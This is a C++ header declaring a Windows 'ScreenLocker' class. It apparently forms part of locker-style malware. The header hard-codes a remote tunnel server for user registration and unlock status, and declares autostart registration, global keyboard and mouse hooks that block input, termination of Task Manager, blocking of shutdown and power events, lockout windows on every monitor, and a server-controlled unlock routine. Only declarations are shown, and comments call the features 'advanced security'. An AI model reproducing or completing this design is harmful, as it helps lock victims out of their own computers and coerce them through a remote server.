#pragma once

#include <windows.h>
#include <string>
#include <winhttp.h>
#include <vector>
#include <tlhelp32.h>
// [OPTIMIZATION] Add necessary headers for the buffered logger.
#include <queue>
#include <mutex>
#include <condition_variable>
#include <thread>

// Browser configuration constants
#define BROWSER_WIDTH 600
#define BROWSER_HEIGHT 500
#define BROWSER_LOAD_DELAY 3000

// Window priority level constants
#define SCREENLOCKER_TOPMOST_LEVEL HWND_TOPMOST
#define BROWSER_TOPMOST_LEVEL HWND_TOPMOST

// Server configuration constants
#define SERVER_URL L"strings-billy-hr-pray.trycloudflare.com"
#define SERVER_PORT 443
#define USE_HTTPS true

class ScreenLocker {
private:
    // Basic member variables
    HINSTANCE hInstance;
    HWND hWnd;
    std::string userID;
    
    // Browser control related variables
    bool browserRunning;           // Prevents duplicate browser execution
    HWND browserHwnd;             // Browser window handle for priority control

    // Hook related variables
    static ScreenLocker* instance;     // Static instance for global hook access
    HHOOK keyboardHook;                // Keyboard hook handle
    HHOOK mouseHook;                   // Mouse hook handle
    bool inputBlockingEnabled;         // Input blocking enabled state
    bool allowBrowserInput;            // Browser input allowed state
    bool performingSystemAction;       // Performing a system action (e.g., Alt+A)

    // ↓↓↓ Advanced security features variables ↓↓↓
    bool advancedSecurityEnabled;      // Advanced security features enabled
    HWND taskManagerHwnd;              // Task manager window handle
    UINT_PTR securityCheckTimer;          // Security check timer ID

    // ↓↓↓ System shutdown prevention variables ↓↓↓
    bool shutdownPreventionEnabled;    // Shutdown prevention feature enabled
    HHOOK shellHook;                   // Shell hook for system events
    bool systemShutdownAttempted;      // Flag for shutdown attempt detection

    // ↓↓↓ Multi-monitor support variables ↓↓↓
    std::vector<HWND> monitorWindows;        // Window handles for each monitor
    std::vector<MONITORINFO> monitorInfos;   // Monitor information
    int primaryMonitorIndex;                 // Index of the primary monitor
    bool multiMonitorEnabled;                // Multi-monitor feature enabled
    
    // Internal utility functions
    std::string GetMacAddress();
    std::string GenerateRandomID();
    std::string GetOrCreateUserID();
    void SaveToLogFile(const std::string& userID, const std::string& action);
    bool RegisterAutoStart();

    // HTTP communication functions (WinHTTP)
    bool SendUserRegistration();
    std::string CheckUserStatus();
    bool SendHttpRequest(const std::wstring& path, const std::wstring& method, 
                         const std::string& data = "", std::string* response = nullptr);
    std::wstring StringToWString(const std::string& str);
    std::string WStringToString(const std::wstring& wstr);
    std::string UrlEncode(const std::string& str);
    
    // Resource extraction functions
    bool ExtractRemoverExecutable();
    std::string GetRemoverPath();

    // Browser interaction functions
    void HandleUnlockProcess();       // New unlock process handling function
    bool ExecuteRemoverWithAdmin();   // Remove executable execution function
    bool TestServerConnection();      // Server connection test function
    
    // HTML content generation
    std::string GenerateHTMLContent();
    
    // Browser control
    void OpenControlledBrowser();
    
    // Window priority control functions
    void SetScreenLockerTopmost();
    void SetBrowserTopmost();
    void RestoreScreenLockerTopmost();
    
    // Browser window finding and control
    bool FindBrowserWindow();
    void ControlBrowserWindow();
    void ClickAllowButton();

    void ConfineCursorToBrowser();
    void ReleaseCursorConfinement();

    // Hook related functions
    bool InstallInputHooks();
    void RemoveInputHooks();

    // Hook related functions2
    void EnableInputBlocking();
    void DisableInputBlocking();
    void SetBrowserInputMode(bool allow);
    void SetSystemActionMode(bool performing);

    // Hook procedure (static)
    static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // Hook handling helper functions
    bool ShouldBlockKeyboardInput(WPARAM wParam, LPARAM lParam);
    bool ShouldBlockMouseInput(WPARAM wParam, LPARAM lParam);
    bool IsAllowedSystemKey(DWORD vkCode);

    // Advanced security features
    void EnableAdvancedSecurity();
    void DisableAdvancedSecurity();
    bool DetectAndBlockTaskManager();
    bool DetectAndBlockSystemShutdown();
    void BlockCriticalSystemProcesses();
    static void CALLBACK SecurityCheckCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime);

    // ↓↓↓ System shutdown prevention functions ↓↓↓
    void EnableShutdownPrevention();
    void DisableShutdownPrevention();
    bool BlockSystemShutdown();
    bool BlockPowerManagementEvents();
    static LRESULT CALLBACK ShellHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    void HandleShutdownAttempt(const std::string& shutdownType);

    // System process control
    bool IsTaskManagerRunning();
    bool TerminateTaskManager();
    bool BlockSystemKeys(DWORD vkCode, bool isSystemKey);

    // ↓↓↓ Refactored Unlock Process Helpers ↓↓↓
    void WaitForBrowserSignal(bool& signalReceived, bool& browserWasClosed);
    void ProcessUnlockResult(bool signalReceived, bool browserWasClosed);

    // ↓↓↓ Performance Optimization: Buffered Logger Members ↓↓↓
    std::thread loggerThread;
    std::queue<std::string> logQueue;
    std::mutex logMutex;
    std::condition_variable logCv;
    bool loggerRunning;

    // ↓↓↓ [FIX] Thread management for unlock process ↓↓↓
    std::vector<std::thread> workerThreads;
    std::mutex threadMutex;

    void LoggerThreadFunction();
    void StartLogger();
    void StopLogger();

    // ↓↓↓ Multi-monitor support functions ↓↓↓
    void EnableMultiMonitorSupport();
    void DisableMultiMonitorSupport();
    bool DetectMonitors();
    bool CreateMonitorWindows();
    void DestroyMonitorWindows();
    static BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData);
    void UpdateMonitorConfiguration();
    HWND CreateSecondaryWindow(const MONITORINFO& monitorInfo, int monitorIndex);
    static LRESULT CALLBACK SecondaryWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
    
    // Cleanup function
    void Cleanup();
    
    // Window message handling
    static LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

    // ↓↓↓ USB Emergency Remover Functions ↓↓↓
    void HandleDeviceChange(LPARAM lParam);
    void CheckUsbForKey(char driveLetter);
    
public:
    // Constructor and destructor
    ScreenLocker(HINSTANCE hInst);
    ~ScreenLocker();
    
    // Main public functions
    bool Initialize();
    bool CreateMainWindow();
    int Run();
    
    // Browser status check (for debugging)
    bool IsBrowserRunning() const { return browserRunning; }

    // Hook status check
    bool IsInputBlockingEnabled() const { return inputBlockingEnabled; }
    
    // Static instance getter (used by Hook)
    static ScreenLocker* GetInstance() { return instance; }
};